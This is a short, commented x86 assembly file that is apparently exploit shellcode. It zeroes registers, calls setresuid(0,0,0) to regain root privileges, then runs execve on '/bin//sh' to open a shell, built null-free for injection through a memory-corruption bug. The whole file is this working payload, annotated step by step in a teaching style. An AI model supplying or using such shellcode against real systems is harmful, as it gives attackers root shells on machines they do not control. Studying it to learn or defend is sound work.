BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  xor edx, edx      ; zero out edx
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; make sure eax is zeroed again
  mov al, 11        ; syscall #11
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

